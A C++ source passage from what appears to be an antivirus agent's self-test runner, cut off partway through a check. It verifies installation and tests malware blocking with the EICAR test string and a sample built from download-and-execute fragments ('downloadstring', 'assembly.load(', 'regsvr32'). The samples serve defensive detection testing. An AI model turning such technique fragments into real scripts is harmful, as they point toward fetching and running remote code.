#include <winsock2.h>
#include "SelfTestRunner.h"

#include <algorithm>
#include <chrono>
#include <cstring>
#include <cwchar>
#include <filesystem>
#include <fstream>
#include <limits>
#include <numeric>
#include <optional>
#include <string>
#include <thread>
#include <vector>

#include "../../../sensor/etw/include/ProcessEtwSensor.h"
#include "../../../sensor/wfp/include/NetworkIsolationManager.h"
#include "AgentConfig.h"
#include "AmsiScanEngine.h"
#include "CryptoUtils.h"
#include "EndpointClient.h"
#include "HardeningManager.h"
#include "PatchOrchestrator.h"
#include "RealtimeProtectionBroker.h"
#include "RuntimeDatabase.h"
#include "RuntimeTrustValidator.h"
#include "ScanEngine.h"
#include "StringUtils.h"
#include "UpdaterService.h"
#include "WscCoexistenceManager.h"

namespace antivirus::agent {
namespace {

constexpr wchar_t kAmsiProviderName[] = L"AntiVirus AMSI Provider";
constexpr wchar_t kMinifilterServiceName[] = L"AntivirusMinifilter";
constexpr wchar_t kServiceExecutableName[] = L"fenrir-agent-service.exe";
constexpr wchar_t kAmsiProviderDllName[] = L"fenrir-amsi-provider.dll";
constexpr wchar_t kSignatureBundleRelativePath[] = L"signatures\\default-signatures.tsv";
constexpr char kDiskBlockingSample[] =
  "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
constexpr char kExecutionBlockingSample[] =
  "# Fenrir self-test execution marker\n"
  "$marker = 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE'\n"
  "Write-Output $marker\n";
constexpr char kCleanwareDiskSample[] =
  "Fenrir cleanware validation sample\n"
  "This file models benign business content and should not trigger malware blocking.\n"
  "Quarterly planning notes: agenda, staffing, and finance follow-up items.\n";
constexpr char kCleanwareExecutionSample[] =
  "# Fenrir cleanware self-test marker\n"
  "$status = 'fenrir-cleanware-selftest'\n"
  "Write-Output $status\n";
constexpr char kBrowserDownloadInstallSample[] =
  "Fenrir benign download/install validation sample\n"
  "Contains routine business installation notes and no script execution content.\n";
constexpr char kPhase2RansomwareBurstSample[] =
  "Fenrir Phase 2 ransomware-burst simulation payload for write-churn validation.\n";
constexpr char kPhase2BenignBulkIoSample[] =
  "Fenrir Phase 2 benign bulk I/O simulation payload for false-positive guardrails.\n";
constexpr std::size_t kDefaultCorpusFileLimit = 400;
constexpr std::size_t kMaxCorpusFileLimit = 5000;

std::wstring JsonEscape(const std::wstring& value) { return Utf8ToWide(EscapeJsonString(value)); }

std::wstring ToLowerCopy(std::wstring value) {
  std::transform(value.begin(), value.end(), value.begin(),
                 [](const wchar_t ch) { return static_cast<wchar_t>(std::towlower(ch)); });
  return value;
}

bool ContainsCaseInsensitive(const std::wstring& text, const std::wstring& needle) {
  if (needle.empty()) {
    return true;
  }

  return ToLowerCopy(text).find(ToLowerCopy(needle)) != std::wstring::npos;
}

struct SignedSystemBinaryCandidate {
  std::filesystem::path path;
  std::wstring signer;
};

void AddCheck(SelfTestReport& report, const std::wstring& id, const std::wstring& name, const SelfTestStatus status,
              const std::wstring& details, const std::wstring& remediation = {}) {
  report.checks.push_back(SelfTestCheck{
      .id = id,
      .name = name,
      .status = status,
      .details = details,
      .remediation = remediation,
  });
}

bool PathExists(const std::filesystem::path& path) {
  std::error_code error;
  return std::filesystem::exists(path, error) && !error;
}

bool IsProcessElevated() {
  HANDLE token = nullptr;
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE) {
    return false;
  }

  TOKEN_ELEVATION elevation{};
  DWORD size = 0;
  const auto ok =
      GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size) != FALSE && elevation.TokenIsElevated != 0;
  CloseHandle(token);
  return ok;
}

std::wstring QueryServiceState(const wchar_t* serviceName) {
  const auto scManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
  if (scManager == nullptr) {
    return {};
  }

  const auto service = OpenServiceW(scManager, serviceName, SERVICE_QUERY_STATUS);
  if (service == nullptr) {
    CloseServiceHandle(scManager);
    return {};
  }

  SERVICE_STATUS_PROCESS status{};
  DWORD bytesNeeded = 0;
  std::wstring state = L"unknown";
  if (QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&status), sizeof(status),
                           &bytesNeeded) != FALSE) {
    switch (status.dwCurrentState) {
      case SERVICE_RUNNING:
        state = L"running";
        break;
      case SERVICE_STOPPED:
        state = L"stopped";
        break;
      case SERVICE_START_PENDING:
        state = L"start_pending";
        break;
      case SERVICE_STOP_PENDING:
        state = L"stop_pending";
        break;
      default:
        state = L"present";
        break;
    }
  }

  CloseServiceHandle(service);
  CloseServiceHandle(scManager);
  return state;
}

bool RegistryKeyExists(HKEY root, const std::wstring& subKey) {
  HKEY key = nullptr;
  const auto status = RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &key);
  if (status == ERROR_SUCCESS && key != nullptr) {
    RegCloseKey(key);
    return true;
  }
  return false;
}

std::wstring ReadRegistryDefaultString(HKEY root, const std::wstring& subKey) {
  HKEY key = nullptr;
  if (RegOpenKeyExW(root, subKey.c_str(), 0, KEY_READ, &key) != ERROR_SUCCESS) {
    return {};
  }

  DWORD type = 0;
  DWORD size = 0;
  std::wstring value;
  if (RegQueryValueExW(key, nullptr, nullptr, &type, nullptr, &size) == ERROR_SUCCESS &&
      (type == REG_SZ || type == REG_EXPAND_SZ) && size >= sizeof(wchar_t)) {
    value.resize(size / sizeof(wchar_t));
    if (RegQueryValueExW(key, nullptr, nullptr, nullptr, reinterpret_cast<LPBYTE>(value.data()), &size) ==
        ERROR_SUCCESS) {
      while (!value.empty() && value.back() == L'\0') {
        value.pop_back();
      }
    } else {
      value.clear();
    }
  }

  RegCloseKey(key);
  return value;
}

std::optional<std::wstring> FindAmsiProviderKey() {
  HKEY providers = nullptr;
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\AMSI\\Providers", 0, KEY_READ, &providers) !=
      ERROR_SUCCESS) {
    return std::nullopt;
  }

  wchar_t nameBuffer[256] = {};
  DWORD index = 0;
  while (true) {
    DWORD nameLength = static_cast<DWORD>(std::size(nameBuffer));
    const auto status = RegEnumKeyExW(providers, index, nameBuffer, &nameLength, nullptr, nullptr, nullptr, nullptr);
    if (status == ERROR_NO_MORE_ITEMS) {
      break;
    }
    if (status == ERROR_SUCCESS) {
      const auto keyPath = std::wstring(L"SOFTWARE\\Microsoft\\AMSI\\Providers\\") +
                           std::wstring(nameBuffer, nameLength);
      if (ReadRegistryDefaultString(HKEY_LOCAL_MACHINE, keyPath) == kAmsiProviderName) {
        RegCloseKey(providers);
        return keyPath;
      }
    }
    ++index;
  }

  RegCloseKey(providers);
  return std::nullopt;
}

bool IsProbablyPrivilegeBoundary(const std::wstring& value) {
  const auto lower = std::wstring([&value] {
    std::wstring lowered = value;
    std::transform(lowered.begin(), lowered.end(), lowered.begin(),
                   [](const wchar_t ch) { return static_cast<wchar_t>(std::towlower(ch)); });
    return lowered;
  }());
  return lower.find(L"access") != std::wstring::npos || lower.find(L"denied") != std::wstring::npos ||
         lower.find(L"privilege") != std::wstring::npos || lower.find(L"elevat") != std::wstring::npos ||
         lower.find(L"service context") != std::wstring::npos;
}

std::size_t ResolveCorpusFileLimit() {
  const auto raw = ReadEnvironmentVariable(L"ANTIVIRUS_PHASE1_CORPUS_MAX_FILES");
  if (raw.empty()) {
    return kDefaultCorpusFileLimit;
  }

  try {
    const auto parsed = std::stoull(raw);
    if (parsed == 0) {
      return kDefaultCorpusFileLimit;
    }
    return static_cast<std::size_t>(std::min<unsigned long long>(parsed, kMaxCorpusFileLimit));
  } catch (...) {
    return kDefaultCorpusFileLimit;
  }
}

constexpr char kPhase3AmsiMaliciousSample[] =
  "downloadstring :8443\n"
  "assembly.load(\n"
  "regsvr32 \n";
constexpr char kPhase3AmsiBenignSample[] =
  "Get-ChildItem Documents *.txt\n"
  "Write-Output report\n";

std::vector<std::filesystem::path> CollectCorpusSampleFiles(const std::filesystem::path& root,
                                                            const std::size_t fileLimit, bool* truncated) {
  if (truncated != nullptr) {
    *truncated = false;
  }

  std::vector<std::filesystem::path> files;
  if (fileLimit == 0) {
    return files;
  }

  std::error_code error;
  if (std::filesystem::is_regular_file(root, error)) {
    files.push_back(root);
    return files;
  }

  error.clear();
  if (!std::filesystem::is_directory(root, error)) {
    return files;
  }

  for (std::filesystem::recursive_directory_iterator iterator(
           root, std::filesystem::directory_options::skip_permission_denied, error);
       iterator != std::filesystem::recursive_directory_iterator(); iterator.increment(error)) {
    if (error) {
      error.clear();
      continue;
    }

    if (iterator->is_regular_file(error)) {
      files.push_back(iterator->path());
      if (files.size() >= fileLimit) {
        if (truncated != nullptr) {
          *truncated = true;
        }
        break;
      }
    }

    if (error) {
      error.clear();
    }
  }

  std::sort(files.begin(), files.end());
  return files;
}

std::optional<SignedSystemBinaryCandidate> FindSignedSystemBinaryCandidate() {
  std::vector<std::filesystem::path> candidates;
  const auto windowsRoot = std::filesystem::path(ReadEnvironmentVariable(L"WINDIR"));
  if (!windowsRoot.empty()) {
    candidates.push_back(windowsRoot / L"System32" / L"notepad.exe");
    candidates.push_back(windowsRoot / L"System32" / L"cmd.exe");
    candidates.push_back(windowsRoot / L"System32" / L"WindowsPowerShell" / L"v1.0" / L"powershell.exe");
    candidates.push_back(windowsRoot / L"explorer.exe");
  }

  candidates.push_back(std::filesystem::path(L"C:\\Windows\\System32\\notepad.exe"));
  candidates.push_back(std::filesystem::path(L"C:\\Windows\\System32\\cmd.exe"));

  std::sort(candidates.begin(), candidates.end());
  candidates.erase(std::unique(candidates.begin(), candidates.end()), candidates.end());

  for (const auto& candidate : candidates) {
    if (!PathExists(candidate) || !VerifyFileAuthenticodeSignature(candidate)) {
      continue;
    }

    const auto signer = QueryFileSignerSubject(candidate);
    if (signer.empty()) {
      continue;
    }

    return SignedSystemBinaryCandidate{.path = candidate, .signer = signer};
  }

  return std::nullopt;
}

std::filesystem::path ResolveSignatureBundlePath(const std::filesystem::path& installRoot) {
  const auto envPath = ReadEnvironmentVariable(L"ANTIVIRUS_SIGNATURE_BUNDLE_PATH");
  if (!envPath.empty()) {
    return std::filesystem::path(envPath);
  }

  const auto candidate = installRoot / kSignatureBundleRelativePath;
  if (PathExists(candidate)) {
    return candidate;
  }

  const auto repoCandidate = std::filesystem::current_path() / L"agent" / L"windows" / L"signatures" /
                             L"default-signatures.tsv";
  return repoCandidate;
}

std::filesystem::path BuildSelfTestValidationRoot(const AgentConfig& config) {
  std::error_code error;
  auto root = std::filesystem::temp_directory_path(error);
  if (error || root.empty()) {
    root = config.runtimeDatabasePath.parent_path();
  }
  if (root.empty()) {
    root = std::filesystem::current_path();
  }
  return root / (L"fenrir-phase1-selftest-" + GenerateGuidString());
}

bool WriteSelfTestSample(const std::filesystem::path& path, const char* content) {
  std::error_code error;
  std::filesystem::create_directories(path.parent_path(), error);
  if (error) {
    return false;
  }

  std::ofstream output(path, std::ios::binary | std::ios::trunc);
  if (!output.is_open()) {
    return false;
  }

  output.write(content, static_cast<std::streamsize>(std::char_traits<char>::length(content)));
  return output.good();
}

bool WriteSelfTestUtf8File(const std::filesystem::path& path, const std::wstring& content) {
  std::error_code error;
  std::filesystem::create_directories(path.parent_path(), error);
  if (error) {
    return false;
  }

  std::ofstream output(path, std::ios::binary | std::ios::trunc);
  if (!output.is_open()) {
    return false;
  }

  const auto utf8Content = WideToUtf8(content);
  output.write(utf8Content.data(), static_cast<std::streamsize>(utf8Content.size()));
  return output.good();
}

bool ProbeDirectoryWriteAccess(const std::filesystem::path& directoryPath, const std::wstring& label,
                               std::wstring* failureDetails) {
  if (directoryPath.empty()) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path is empty.";
    }
    return false;
  }

  std::error_code error;
  std::filesystem::create_directories(directoryPath, error);
  if (error) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path could not be created at " + directoryPath.wstring() + L".";
    }
    return false;
  }

  const auto probePath = directoryPath / (L"fenrir-selftest-writecheck-" + GenerateGuidString() + L".tmp");
  std::ofstream probeFile(probePath, std::ios::binary | std::ios::trunc);
  if (!probeFile.is_open()) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path denied write access at " + directoryPath.wstring() + L".";
    }
    return false;
  }

  probeFile << "fenrir-self-test";
  probeFile.close();

  std::filesystem::remove(probePath, error);
  if (error) {
    if (failureDetails != nullptr) {
      *failureDetails = label + L" path wrote the probe file but cleanup failed at " + probePath.wstring() + L".";
    }
    return false;
  }

  return true;
}

template <std::size_t Capacity>
void CopyWideField(wchar_t (&target)[Capacity], const std::wstring& value) {
  static_assert(Capacity > 0);
  const auto length = std::min<std::size_t>(value.size(), Capacity - 1);
  if (length > 0) {
    std::wmemcpy(target, value.data(), length);
  }
  target[length] = L'\0';
}

bool IsBlockingDisposition(const VerdictDisposition disposition) {
  return disposition == VerdictDisposition::Block || disposition == VerdictDisposition::Quarantine;
}

std::wstring FirstReasonCode(const ScanFinding& finding) {
  if (finding.verdict.reasons.empty()) {
    return L"none";
  }
  return finding.verdict.reasons.front().code;
}

bool FindingHasReasonCode(const ScanFinding& finding, const std::wstring& code) {
  return std::any_of(finding.verdict.reasons.begin(), finding.verdict.reasons.end(),
                     [&code](const auto& reason) { return reason.code == code; });
}

bool FindingHasReasonPrefix(const ScanFinding& finding, const std::wstring& prefix) {
  return std::any_of(finding.verdict.reasons.begin(), finding.verdict.reasons.end(),
                     [&prefix](const auto& reason) { return reason.code.starts_with(prefix); });
}

std::wstring StatusToString(const SelfTestStatus status) {
  switch (status) {
    case SelfTestStatus::Pass:
      return L"pass";
    case SelfTestStatus::Warning:
      return L"warning";
    case SelfTestStatus::Fail:
    default:
      return L"fail";
  }
}

}  // namespace

SelfTestReport RunSelfTest(const AgentConfig& config, const std::filesystem::path& installRoot) {
  SelfTestReport report{
      .generatedAt = CurrentUtcTimestamp(),
      .overallStatus = L"pass",
      .checks = {},
  };
  const auto elevated = IsProcessElevated();

  try {
    RuntimeDatabase database(config.runtimeDatabasePath);
    const auto telemetry = database.LoadTelemetryQueue();
    AddCheck(report, L"runtime_database", L"Runtime database", SelfTestStatus::Pass,
             L"Opened the local SQLite runtime store and read " + std::to_wstring(telemetry.size()) +
                 L" queued telemetry record(s).");
  } catch (const std::exception& error) {
    AddCheck(report, L"runtime_database", L"Runtime database", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Confirm the runtime path is writable and the SQLite bundle is present.");
  }

  const auto servicePath = installRoot / kServiceExecutableName;
  const auto providerDllPath = installRoot / kAmsiProviderDllName;
  const auto signatureBundlePath = ResolveSignatureBundlePath(installRoot);
  AddCheck(report, L"release_layout", L"Release layout",
           PathExists(servicePath) && PathExists(providerDllPath) ? SelfTestStatus::Pass : SelfTestStatus::Fail,
           L"Service binary: " + servicePath.wstring() + L"; AMSI provider: " + providerDllPath.wstring(),
           L"Run the release layout script so the agent executable and AMSI DLL are staged together.");

  AddCheck(report, L"signature_bundle", L"Signature bundle",
           PathExists(signatureBundlePath) ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           PathExists(signatureBundlePath) ? L"Loaded external signature content from " + signatureBundlePath.wstring()
                                           : L"No external signature bundle was found. The engine will fall back to "
                                             L"compiled heuristics only.",
           L"Ship signatures\\default-signatures.tsv with the release layout or set ANTIVIRUS_SIGNATURE_BUNDLE_PATH.");

  const auto amsiProviderKey = FindAmsiProviderKey();
  AddCheck(report, L"amsi_registration", L"AMSI provider registration",
           amsiProviderKey.has_value() ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           amsiProviderKey.has_value()
               ? L"AMSI registration is present at HKLM\\" + *amsiProviderKey
               : L"The AntiVirus AMSI provider is not registered in HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers.",
           L"Run fenrir-agent-service.exe --register-amsi-provider from an elevated context.");

  if (PathExists(servicePath)) {
    const auto signedBinary = VerifyFileAuthenticodeSignature(servicePath);
    AddCheck(report, L"binary_signing", L"Binary signing",
             signedBinary ? SelfTestStatus::Pass : SelfTestStatus::Warning,
             signedBinary ? L"The service binary has a valid Authenticode signature."
                          : L"The service binary is not Authenticode-signed in this build context.",
             L"Sign production binaries before packaging, rollout, and protected-service onboarding.");
  }

  const auto runtimeValidation = ValidateRuntimePaths(config);
  AddCheck(report, L"runtime_path_boundaries", L"Trusted runtime boundaries",
           runtimeValidation.trusted ? SelfTestStatus::Pass : SelfTestStatus::Fail,
           runtimeValidation.trusted
               ? L"Trusted runtime root: " + runtimeValidation.runtimeRootPath.wstring() +
                     L"; install root: " + runtimeValidation.installRootPath.wstring()
               : (runtimeValidation.message.empty()
                      ? L"Runtime boundaries are not trusted."
                      : runtimeValidation.message),
           L"Re-run install or repair so runtime database, state, telemetry, update, quarantine, evidence, and journal paths stay within one trusted runtime root.");

  const auto runtimeTrust = ValidateRuntimeTrust(config, installRoot);
  AddCheck(report, L"runtime_trust_validator", L"Runtime trust validator",
           runtimeTrust.trusted ? (runtimeTrust.signatureWarning ? SelfTestStatus::Warning : SelfTestStatus::Pass)
                               : SelfTestStatus::Fail,
           runtimeTrust.message.empty()
               ? L"Runtime trust validation completed without details."
               : runtimeTrust.message,
           runtimeTrust.trusted
               ? (runtimeTrust.signatureWarning
                      ? L"Sign release binaries or set ANTIVIRUS_REQUIRE_SIGNED_RUNTIME=true to enforce signature posture."
                      : L"")
               : L"Run --repair from an elevated context to refresh runtime trust markers and critical service binaries.");

  std::vector<std::wstring> runtimePathWriteFailures;
  const auto appendWriteFailure = [&runtimePathWriteFailures](const std::filesystem::path& path,
                                                              const std::wstring& label) {
    std::wstring failure;
    if (!ProbeDirectoryWriteAccess(path, label, &failure)) {
      runtimePathWriteFailures.push_back(failure);
    }
  };

  const auto runtimeRootPath = runtimeValidation.runtimeRootPath.empty()
                                   ? config.runtimeDatabasePath.parent_path()
                                   : runtimeValidation.runtimeRootPath;
  appendWriteFailure(runtimeRootPath, L"Runtime root");
  appendWriteFailure(config.runtimeDatabasePath.parent_path(), L"Runtime database root");
  appendWriteFailure(config.stateFilePath.parent_path(), L"State root");
  appendWriteFailure(config.telemetryQueuePath.parent_path(), L"Telemetry queue root");
  appendWriteFailure(config.updateRootPath, L"Update root");
  appendWriteFailure(config.journalRootPath, L"Journal root");
  appendWriteFailure(config.quarantineRootPath, L"Quarantine root");
  appendWriteFailure(config.evidenceRootPath, L"Evidence root");

  if (runtimePathWriteFailures.empty()) {
    AddCheck(report, L"runtime_path_write_access", L"Runtime path write access", SelfTestStatus::Pass,
             L"Runtime, state, telemetry, update, journal, quarantine, and evidence paths are writable.");
  } else {
    std::wstring details;
    for (const auto& failure : runtimePathWriteFailures) {
      if (!details.empty()) {
        details += L" | ";
      }
      details += failure;
    }

    AddCheck(report, L"runtime_path_write_access", L"Runtime path write access", SelfTestStatus::Fail, details,
             L"Re-run install or repair from an elevated context so runtime directories are writable by the service account.");
  }

  const auto phaseValidationRoot = BuildSelfTestValidationRoot(config);
  std::error_code phaseValidationRootError;
  std::filesystem::create_directories(phaseValidationRoot, phaseValidationRootError);
  if (phaseValidationRootError) {
    AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
             L"Self-test could not create staged disk-validation artifacts under " + phaseValidationRoot.wstring() + L".",
             L"Ensure the service can write to the local temp/runtime root before running --self-test.");
    AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
             L"Self-test could not prepare the execution-interception validation workspace at " +
                 phaseValidationRoot.wstring() + L".",
             L"Ensure the service can write to local runtime, evidence, and quarantine roots before running --self-test.");
  } else {
    const auto diskSamplePath = phaseValidationRoot / L"phase1-disk-eicar.txt";
    if (!WriteSelfTestSample(diskSamplePath, kDiskBlockingSample)) {
      AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
               L"Self-test could not write the staged disk-scan sample at " + diskSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and retry self-test from the target endpoint context.");
    } else {
      auto diskPolicy = CreateDefaultPolicySnapshot();
      diskPolicy.cloudLookupEnabled = false;
      diskPolicy.quarantineOnMalicious = false;

      const auto diskFinding = ScanFile(diskSamplePath, diskPolicy);
      if (diskFinding.has_value() && IsBlockingDisposition(diskFinding->verdict.disposition)) {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Pass,
                 L"ScanFile blocked the staged disk artifact with disposition " +
                     VerdictDispositionToString(diskFinding->verdict.disposition) + L" at confidence " +
                     std::to_wstring(diskFinding->verdict.confidence) + L" (reason " +
                     FirstReasonCode(*diskFinding) + L").");
      } else if (diskFinding.has_value()) {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
                 L"ScanFile returned disposition " + VerdictDispositionToString(diskFinding->verdict.disposition) +
                     L" for the staged artifact (confidence " + std::to_wstring(diskFinding->verdict.confidence) + L").",
                 L"Review scan signatures/heuristics so known-malicious artifacts are blocked on disk.");
      } else {
        AddCheck(report, L"phase1_disk_blocking", L"Phase 1 disk-time blocking", SelfTestStatus::Fail,
                 L"ScanFile produced no finding for the staged disk-validation artifact at " + diskSamplePath.wstring() + L".",
                 L"Review scan signatures/heuristics and exclusions so known-malicious artifacts are detected on disk.");
      }
    }

    const auto executionSamplePath = phaseValidationRoot / L"phase1-execution-eicar.ps1";
    if (!WriteSelfTestSample(executionSamplePath, kExecutionBlockingSample)) {
      AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
               L"Self-test could not write the staged execute-time sample at " + executionSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and retry self-test from the target endpoint context.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated realtime evidence/quarantine paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before validating execution blocking.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          RealtimeFileScanRequest request{};
          request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
          request.requestSize = sizeof(request);
          request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                               std::chrono::system_clock::now().time_since_epoch())
                                                               .count());
          request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_EXECUTE;
          request.processId = GetCurrentProcessId();
          request.threadId = GetCurrentThreadId();

          std::error_code absolutePathError;
          auto resolvedExecutionSamplePath = std::filesystem::absolute(executionSamplePath, absolutePathError);
          if (absolutePathError) {
            resolvedExecutionSamplePath = executionSamplePath;
          }

          std::error_code sampleSizeError;
          request.fileSizeBytes = std::filesystem::file_size(resolvedExecutionSamplePath, sampleSizeError);
          if (sampleSizeError) {
            request.fileSizeBytes = 0;
          }

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          CopyWideField(request.correlationId, L"self-test-phase1-execution");
          CopyWideField(request.path, resolvedExecutionSamplePath.wstring());
          CopyWideField(request.processImage, processImage);
          CopyWideField(request.parentImage, processImage);
          CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test");
          CopyWideField(request.userSid, L"S-1-5-18");

          const auto outcome = broker.InspectFile(request);
          if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK &&
              IsBlockingDisposition(outcome.finding.verdict.disposition)) {
            AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Pass,
                     L"Realtime execute inspection returned action block with disposition " +
                         VerdictDispositionToString(outcome.finding.verdict.disposition) + L" at confidence " +
                         std::to_wstring(outcome.finding.verdict.confidence) + L" (reason " +
                         FirstReasonCode(outcome.finding) + L").");
          } else {
            AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                     L"Realtime execute inspection returned action " +
                         std::wstring(outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ? L"block" : L"allow") +
                         L" with disposition " + VerdictDispositionToString(outcome.finding.verdict.disposition) + L".",
                     L"Review realtime broker policy/scoring so execution-time malicious artifacts are blocked.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                 L"Realtime execute validation failed: " + Utf8ToWide(error.what()),
                 L"Validate local runtime database/evidence paths and rerun self-test in the endpoint service context.");
      }
    }

    const auto cleanwareSamplePath = phaseValidationRoot / L"phase1-cleanware-business-note.txt";
    if (!WriteSelfTestSample(cleanwareSamplePath, kCleanwareDiskSample)) {
      AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
               SelfTestStatus::Fail,
               L"Self-test could not write the staged cleanware scan sample at " + cleanwareSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto cleanwarePolicy = CreateDefaultPolicySnapshot();
      cleanwarePolicy.cloudLookupEnabled = false;
      cleanwarePolicy.quarantineOnMalicious = false;

      const auto cleanwareFinding = ScanFile(cleanwareSamplePath, cleanwarePolicy);
      if (!cleanwareFinding.has_value()) {
        AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
                 SelfTestStatus::Pass,
                 L"ScanFile produced no finding for staged cleanware content in " + cleanwareSamplePath.wstring() + L".");
      } else {
        AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
                 SelfTestStatus::Fail,
                 L"ScanFile returned disposition " + VerdictDispositionToString(cleanwareFinding->verdict.disposition) +
                     L" for staged cleanware content (reason " + FirstReasonCode(*cleanwareFinding) + L").",
                 L"Tune heuristic signatures/scores so clean business content is not surfaced as a malware finding.");
      }
    }

    const auto cleanwareExecutionPath = phaseValidationRoot / L"phase1-cleanware-execution.ps1";
    if (!WriteSelfTestSample(cleanwareExecutionPath, kCleanwareExecutionSample)) {
      AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
               SelfTestStatus::Fail,
               L"Self-test could not write the staged cleanware execution sample at " +
                   cleanwareExecutionPath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-cleanware-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"phase1-cleanware-quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"phase1-cleanware-evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                   SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated realtime cleanware paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before validating cleanware execution allowance.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          RealtimeFileScanRequest request{};
          request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
          request.requestSize = sizeof(request);
          request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                               std::chrono::system_clock::now().time_since_epoch())
                                                               .count());
          request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_EXECUTE;
          request.processId = GetCurrentProcessId();
          request.threadId = GetCurrentThreadId();

          std::error_code absolutePathError;
          auto resolvedExecutionSamplePath = std::filesystem::absolute(cleanwareExecutionPath, absolutePathError);
          if (absolutePathError) {
            resolvedExecutionSamplePath = cleanwareExecutionPath;
          }

          std::error_code sampleSizeError;
          request.fileSizeBytes = std::filesystem::file_size(resolvedExecutionSamplePath, sampleSizeError);
          if (sampleSizeError) {
            request.fileSizeBytes = 0;
          }

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          CopyWideField(request.correlationId, L"self-test-phase1-cleanware-execution");
          CopyWideField(request.path, resolvedExecutionSamplePath.wstring());
          CopyWideField(request.processImage, processImage);
          CopyWideField(request.parentImage, processImage);
          CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test");
